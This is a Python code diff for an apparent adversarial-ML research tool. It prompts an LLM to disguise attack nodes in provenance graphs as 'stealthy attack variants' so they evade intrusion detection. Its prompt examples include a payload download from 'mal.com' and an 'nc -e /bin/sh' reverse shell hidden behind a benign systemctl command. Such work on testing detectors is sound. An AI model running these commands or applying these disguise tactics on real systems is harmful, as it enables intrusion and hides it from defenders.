@@ -20,6 +20,39 @@ try:
 except ImportError:
     ig = None
 
+_SEM_LOG_COUNT = 0
+
+def _log_semantic_mutation(g_mut, before_props, before_strategies, mutations, llm_response, model_name="unknown"):
+    """记录每次语义变异的完整信息：策略、变异前后、LLM 原始输出"""
+    global _SEM_LOG_COUNT
+    _SEM_LOG_COUNT += 1
+    safe_name = model_name.replace("/", "_")
+    log_file = f"semantic_mutation_log_{safe_name}.txt"
+
+    with open(log_file, "a") as f:
+        f.write(f"\n{'='*60}\n")
+        f.write(f"调用 #{_SEM_LOG_COUNT}\n")
+        f.write(f"{'='*60}\n")
+
+        # 每个节点的变异前后对比
+        for idx, prop_before in before_props.items():
+            strategy, atk_parts, ben_parts = before_strategies.get(idx, ("?","",""))
+            prop_after = _get_properties(g_mut, idx) if idx < g_mut.vcount() else "?"
+            changed = "✓ CHANGED" if prop_before != prop_after else "  unchanged"
+            f.write(f"\n  Node idx={idx} strategy={strategy} {changed}\n")
+            if atk_parts:
+                f.write(f"    ATTACK_PARTS: {atk_parts}\n")
+            if ben_parts:
+                f.write(f"    BENIGN_PARTS: {ben_parts}\n")
+            f.write(f"    BEFORE: {prop_before}\n")
+            f.write(f"    AFTER:  {prop_after}\n")
+
+        # LLM 原始输出
+        f.write(f"\n  LLM parsed mutations: {len(mutations)}\n")
+        for m in mutations:
+            f.write(f"    {m}\n")
+        f.write(f"\n  LLM raw response (first 500 chars):\n    {llm_response[:500]}\n")
+
 
 def _clean_set_str(prop: str) -> str:
     """将 str(set(...)) 格式的 properties 清理为单条字符串。
@@ -187,42 +220,70 @@ def build_semantic_mutation_prompt(
     """
     构建语义变异的 LLM prompt（论文 Figure 5）。
 
-    Args:
-        nodes_info: [{"node_id": int, "properties": str, "associated_nodes": str,
-                       "strategy": str, "node_type": str}, ...]
-        context_triples: 对应每个节点的上下文三元组
-
-    Returns:
-        str: LLM prompt
+    为每个节点标注哪些部分是攻击特有的（不在良性语料 H_b 中，必须保留），
+    哪些是良性的（在 H_b 中，可以替换），让 LLM 做精准变异。
     """
+
     prompt_parts = [
-        "[Context] The following attack process nodes are embedded in a provenance graph "
-        "with their associated file/network nodes and r-hop benign context C.\n"
-        "Node properties format: process='cmdLine,tgid,path', "
-        "file='filepath', network='srcaddr,srcport,dstaddr,dstport'.\n"
+        "You are creating stealthy attack variants in a provenance graph. "
+        "Properties format: cmdLine,tgid,path (3 comma-separated fields).\n\n"
+        "## Key principle\n"
+        "Each node has ATTACK-SPECIFIC parts and BENIGN parts, determined by historical benign data H_b.\n"
+        "- ATTACK-SPECIFIC (not in H_b): MUST be preserved — this is the attack semantics.\n"
+        "- BENIGN (in H_b): can be replaced with other benign values to disguise the attack.\n\n"
+        "## Strategies\n"
+        "- replacement: command name is benign (in H_b), args are attack-specific (not in H_b).\n"
+        "  → Keep the attack args, replace the command name with a different benign command.\n"
+        "  Example: wget http://mal.com/pay.sh,1234,/usr/bin/wget\n"
+        "  KEEP: http://mal.com/pay.sh  REPLACE: wget\n"
+        "  → curl -H \"X-Health-Check: true\" http://mal.com/pay.sh,1234,/usr/bin/curl\n\n"
+        "- rewriting: both command and args are benign (in H_b).\n"
+        "  → Rewrite the entire cmdLine to fit the surrounding context.\n"
+        "  Example: python /tmp/script.py,5678,/usr/bin/python\n"
+        "  → php /var/www/cgi-bin/handler.php,5678,/usr/bin/php\n\n"
+        "- extension: both command and args are attack-specific (not in H_b).\n"
+        "  → Keep the ENTIRE command unchanged, prepend/append benign operations.\n"
+        "  Example: nc -e /bin/sh attacker 4444,9999,/usr/bin/nc\n"
+        "  KEEP ALL. Wrap it:\n"
+        "  → systemctl status nginx && nc -e /bin/sh attacker 4444,9999,/usr/bin/nc\n\n"
     ]
-    prompt_parts.append(f"[Input] {len(nodes_info)} nodes:\n")
+
+    prompt_parts.append(f"## Nodes to mutate ({len(nodes_info)})\n\n")
 
     for i, info in enumerate(nodes_info):
-        ctx = "; ".join(context_triples[i][:20]) if i < len(context_triples) else ""
+        ctx_list = context_triples[i][:10] if i < len(context_triples) else []
+        ctx = "; ".join(ctx_list) if ctx_list else "N/A"
+        atk = info.get("attack_parts", "")
+        ben = info.get("benign_parts", "")
         prompt_parts.append(
-            f"  Node {i+1}: type={info.get('node_type', 'process')}, "
-            f"properties={info['properties']}, "
-            f"associated_nodes={info.get('associated_nodes', 'N/A')}, "
-            f"strategy={info['strategy']}, C={{{ctx}}}\n"
+            f"Node {i+1}:\n"
+            f"  properties: {info['properties']}\n"
+            f"  strategy: {info['strategy']}\n"
         )
+        if atk:
+            prompt_parts.append(f"  ATTACK-SPECIFIC (must keep): {atk}\n")
+        if ben:
+            prompt_parts.append(f"  BENIGN (can replace): {ben}\n")
+        # 关联的文件/网络节点（带真实图索引）
+        assoc = info.get("associated_nodes", [])
+        if assoc:
+            prompt_parts.append(f"  associated file/network nodes (use these exact ids in associated_updates):\n")
+            for a in assoc:
+                prompt_parts.append(f"    {a}\n")
+        prompt_parts.append(f"  context: {ctx}\n\n")
 
     prompt_parts.append(
-        "\n[Task] Mutate each node's properties via its assigned strategy:\n"
-        "  A. Replacement: preserve the attack-critical component of the command, "
-        "replace the other args/paths with benign values guided by C.\n"
-        "  B. Rewriting: rewrite the entire cmdLine into a different expression "
-        "guided by C that fits the surrounding benign context.\n"
-        "  C. Extension: preserve entire command, prepend/append benign operations from C.\n"
-        "For each mutated node, output the FULL new properties string in the same format.\n"
-        "Constraints: (1) generated values must be legitimate system commands, file names, "
-        "or IP addresses; (2) mutated values must be compatible with neighboring operations in C.\n"
-        "\n[Output] JSON: [{node_id, new_properties, associated_updates: [{node_id, new_properties}]}].\n"
+        "## Output\n"
+        "Return ONLY a JSON array:\n"
+        '[{"node_id": 1, "new_properties": "cmdLine,tgid,path", '
+        '"associated_updates": [{"node_id": <exact_graph_id>, "new_properties": "..."}]}]\n\n'
+        "Rules:\n"
+        "1. Process node: cmdLine,tgid,path (exactly 3 fields, keep tgid unchanged)\n"
+        "2. ATTACK-SPECIFIC parts MUST appear in new_properties\n"
+        "3. Only replace BENIGN parts with other benign values\n"
+        "4. associated_updates: use the EXACT graph ids listed above for each associated node. "
+        "Update file paths and network addresses to match the mutated process semantics\n"
+        "5. Do NOT include metadata (strategy, context, etc.) in new_properties\n"
     )
 
     return "".join(prompt_parts)
@@ -235,6 +296,7 @@ def apply_semantic_mutation_llm(
     benign_args: Set[str],
     llm_fn=None,
     r_hop: int = 2,
+    model_name: str = "unknown",
 ) -> Optional:
     """
     对变异图中的攻击节点执行语义变异（修改 properties）。
@@ -271,11 +333,35 @@ def apply_semantic_mutation_llm(
         else:
             continue
 
+        # 解析 H_b 判断细节：哪些在良性语料中、哪些不在
+        attack_parts = ""
+        benign_parts = ""
+        if node_type == "process":
+            cmd_line, _tgid, _path = _parse_process_properties(prop)
+            parts = cmd_line.split()
+            if parts:
+                cmd = parts[0]
+                node_args = " ".join(parts[1:]) if len(parts) > 1 else ""
+                cmd_in = cmd in benign_commands
+                args_in = bool(node_args) and set(parts[1:]).issubset(benign_args)
+                # 不在 H_b 中的 = 攻击特有的，必须保留
+                if not cmd_in:
+                    attack_parts = cmd + (" " + node_args if node_args else "")
+                elif not args_in and node_args:
+                    attack_parts = node_args
+                # 在 H_b 中的 = 良性的，可以替换
+                if cmd_in:
+                    benign_parts = cmd
+                if args_in and node_args:
+                    benign_parts += (" " + node_args if benign_parts else node_args)
+
         target_nodes.append({
             "idx": idx,
             "properties": prop,
             "strategy": strategy,
             "node_type": node_type,
+            "attack_parts": attack_parts,
+            "benign_parts": benign_parts,
         })
 
     if not target_nodes:
@@ -299,23 +385,32 @@ def apply_semantic_mutation_llm(
             associated = []
             for nb in g_mut.neighbors(pn["idx"], mode="all"):
                 nb_type = str(g_mut.vs[nb].attributes().get("type", "")).lower()
-                nb_prop = _get_properties(g_mut, nb)[:32]
+                nb_prop = _get_properties(g_mut, nb)
                 if "file" in nb_type or "net" in nb_type or "flow" in nb_type:
-                    associated.append(f"{nb_type}:{nb_prop}")
+                    associated.append(f"id={nb} type={nb_type} properties={nb_prop[:50]}")
             nodes_info.append({
                 "node_id": pn["idx"],
                 "properties": pn["properties"],
-                "associated_nodes": "; ".join(associated[:5]),
+                "associated_nodes": associated[:5],
                 "strategy": pn["strategy"],
                 "node_type": pn["node_type"],
+                "attack_parts": pn.get("attack_parts", ""),
+                "benign_parts": pn.get("benign_parts", ""),
             })
 
         prompt = build_semantic_mutation_prompt(nodes_info, context_triples)
 
         try:
+            # 记录变异前
+            before_props = {pn["idx"]: pn["properties"] for pn in proc_only}
+            before_strategies = {pn["idx"]: (pn["strategy"], pn.get("attack_parts",""), pn.get("benign_parts","")) for pn in proc_only}
+
             response = llm_fn(prompt)
             mutations = _parse_llm_response(response)
             _apply_mutations(g_mut, mutations, proc_only)
+
+            # 记录变异后，写日志
+            _log_semantic_mutation(g_mut, before_props, before_strategies, mutations, response, model_name=model_name)
         except Exception as ex:
             print(f"[SemMut] LLM 变异失败: {ex}")
     elif proc_only:
@@ -326,13 +421,27 @@ def apply_semantic_mutation_llm(
 
 
 def _parse_llm_response(response: str) -> List[Dict]:
-    """解析 LLM 返回的 JSON 变异结果"""
+    """解析 LLM 返回的 JSON 变异结果（含容错）"""
     try:
         text = response.strip()
         if "```json" in text:
             text = text.split("```json")[1].split("```")[0].strip()
         elif "```" in text:
             text = text.split("```")[1].split("```")[0].strip()
+
+        # 尝试直接解析
+        try:
+            result = json.loads(text)
+            if isinstance(result, list):
+                return result
+        except json.JSONDecodeError:
+            pass
+
+        # 容错：修复 JSON 数组中对象之间缺少逗号的情况
+        import re
+        text = re.sub(r'\}\s*\{', '},{', text)
+        # 容错：多个独立 JSON 数组拼接
+        text = re.sub(r'\]\s*\[', ',', text)
 
         result = json.loads(text)
         if isinstance(result, list):
@@ -376,7 +485,7 @@ def _apply_mutations(g_mut, mutations: List[Dict], process_nodes: List[Dict]):
         if actual_idx < g_mut.vcount():
             g_mut.vs[actual_idx]["properties"] = str(new_props)
 
-        # 关联节点更新
+        # 关联节点更新（prompt 中已给出真实图索引，LLM 直接返回）
         for update in mut.get("associated_updates", []):
             if isinstance(update, dict):
                 try:
